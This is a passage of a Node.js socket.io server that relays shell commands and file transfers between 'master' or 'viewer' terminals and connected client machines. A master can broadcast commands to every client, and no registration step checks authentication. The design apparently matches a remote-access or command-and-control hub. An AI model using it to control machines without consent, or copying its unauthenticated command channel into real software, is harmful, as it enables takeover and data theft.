      if (set) set.forEach(s => s.emit('error', `[${clientId}] ${data}`));
      masters.forEach(ms => ms.emit('error', `[${clientId}] ${data}`));
    });

    // Forward client "system" messages (previously dropped)
    socket.on('system', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('system', `[${clientId}] ${data}`));
      masters.forEach(ms => ms.emit('system', `[${clientId}] ${data}`));
    });

    socket.on('directory', (dir) => {
      const cd = clients.get(clientId);
      if (cd) cd.cwd = dir;                 // keep server-side cwd accurate
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('directory', dir));
      masters.forEach(ms => ms.emit('system', `[${clientId}] Directory changed to: ${dir}`));
    });

    socket.on('run-command', (cmd) => {
      socket.emit('command', cmd);
    });

    // ---------- file download events FROM client ----------
    socket.on('file-download-start', (meta) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-start', meta));
      masters.forEach(ms => ms.emit('download-start', meta));
    });
    socket.on('file-download-chunk', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-chunk', data));
      masters.forEach(ms => ms.emit('download-chunk', data));
    });
    socket.on('file-download-end', () => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-end'));
      masters.forEach(ms => ms.emit('download-end'));
    });
    socket.on('file-download-error', (msg) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('download-error', msg));
      masters.forEach(ms => ms.emit('download-error', msg));
    });

    socket.on('file-uploaded', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('upload-complete', data));
      masters.forEach(ms => ms.emit('upload-complete', data));
    });
    socket.on('file-upload-error', (msg) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('upload-error', msg));
      masters.forEach(ms => ms.emit('upload-error', msg));
    });
    socket.on('upload-progress', (data) => {
      const set = viewers.get(clientId);
      if (set) set.forEach(s => s.emit('upload-progress', data));
      masters.forEach(ms => ms.emit('upload-progress', data));
    });
  });

  // ---------- VIEWER REGISTRATION ----------
  socket.on('register-viewer', (id) => {
    role = 'viewer';
    clientId = id;
    if (!clients.has(clientId)) {
      socket.emit('system', '[System] Error: Client not connected or invalid UUID');
      return;
    }
    if (!viewers.has(clientId)) viewers.set(clientId, new Set());
    viewers.get(clientId).add(socket);

    const clientData = clients.get(clientId);
    socket.emit('system', `[System] Connected to client ${clientId}`);
    socket.emit('directory', clientData.cwd);

    socket.on('command', (cmd) => {
      clientData.socket.emit('run-command', cmd);
      socket.emit('command', cmd);
    });

    socket.on('disconnect', () => {
      const set = viewers.get(clientId);
      if (set) {
        set.delete(socket);
        if (set.size === 0) viewers.delete(clientId);
      }
    });

    // viewer upload
    socket.on('upload-start', (meta) => { clientData.socket.emit('file-upload-start', meta); });
    socket.on('upload-chunk', (data) => { clientData.socket.emit('file-upload-chunk', data); });
    socket.on('upload-end', (data) => { clientData.socket.emit('file-upload-end', data); });

    // viewer download
    socket.on('download-request', (data) => {
      clientData.socket.emit('file-download-request', { path: data.path });
    });
  });

  // ---------- MASTER REGISTRATION ----------
  socket.on('register-master', () => {
    role = 'master';
    masters.add(socket);
    socket.emit('system', '[System] Registered as master terminal');
    console.log('Master terminal connected');

    socket.on('command', (cmd) => {
      clients.forEach(({ socket: clientSocket }) => clientSocket.emit('run-command', cmd));
      socket.emit('command', cmd);
    });

    socket.on('disconnect', () => {
      masters.delete(socket);
      console.log('Master terminal disconnected');
    });

    // master upload (include/exclude aware)
    socket.on('upload-start', (meta) => {
      if (meta.targets === null) {
        clients.forEach((client) => client.socket.emit('file-upload-start', meta));
      } else {
        meta.targets.forEach(id => {
          const client = clients.get(id);
          if (client && client.socket && client.socket.connected) {
            client.socket.emit('file-upload-start', meta);
          }
        });
      }
    });

    socket.on('upload-chunk', (data) => {
      if (data.targets === null) {
        clients.forEach((client) => client.socket.emit('file-upload-chunk', data));
      } else {
        data.targets.forEach(id => {
          const client = clients.get(id);
          if (client && client.socket && client.socket.connected) {
            client.socket.emit('file-upload-chunk', data);
          }
        });
      }
    });

    socket.on('upload-end', (data) => {
      if (data.targets === null) {
        clients.forEach((client) => client.socket.emit('file-upload-end', data));
      } else {
        data.targets.forEach(id => {
          const client = clients.get(id);
          if (client && client.socket && client.socket.connected) {
            client.socket.emit('file-upload-end', data);
          }
        });
      }
    });

    // master download
    socket.on('download-request', (data) => {
      if (data.targets === null || data.targets.length === 0) {
        const firstEntry = clients.entries().next().value;
        if (firstEntry) {
          const [, client] = firstEntry;
          if (client.socket && client.socket.connected) {
            client.socket.emit('file-download-request', { path: data.path });
          } else {
            socket.emit('download-error', 'No connected clients available');
          }
        } else {
          socket.emit('download-error', 'No connected clients available');
        }
      } else {
        const targetId = data.targets[0];
        const client = clients.get(targetId);
        if (client && client.socket && client.socket.connected) {
          client.socket.emit('file-download-request', { path: data.path });
        } else {
          socket.emit('download-error', 'Target client [' + targetId + '] not connected');
        }
      }
    });
  });

  // ---------- TARGETED COMMAND ----------
  socket.on('targeted-command', ({ uuids, cmd }) => {
    if (!Array.isArray(uuids) || typeof cmd !== 'string' || cmd.trim() === '') {
      socket.emit('system', '[System] Invalid targeted command payload');
      return;
    }
    uuids.forEach(id => {
      const client = clients.get(id);
      if (client && client.socket && client.socket.connected) {
        client.socket.emit('run-command', cmd);
      } else {
        socket.emit('system', `[System] Client ${id} unavailable or not connected`);
      }
    });
    socket.emit('command', cmd);
  });
});

// ---------- heartbeat health check ----------
setInterval(() => {
  const now = Date.now();
  const STALE_THRESHOLD = 90000;
  for (const [id, lastHeartbeat] of clientHeartbeats) {
    if (now - lastHeartbeat > STALE_THRESHOLD) {
      const client = clients.get(id);
      if (client && client.socket && client.socket.connected) {
        console.log(`[Health] Client ${id} stale (no heartbeat for ${Math.round((now - lastHeartbeat)/1000)}s) – forcing disconnect`);
        client.socket.disconnect(true);
      }
      clientHeartbeats.delete(id);
    }
  }
}, 30000);

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
  console.log(`  Master:  http://localhost:${PORT}/master`);
  console.log(`  Viewer:  http://localhost:${PORT}/<uuid>`);
  console.log(`  Submit:  POST http://localhost:${PORT}/submission`);
});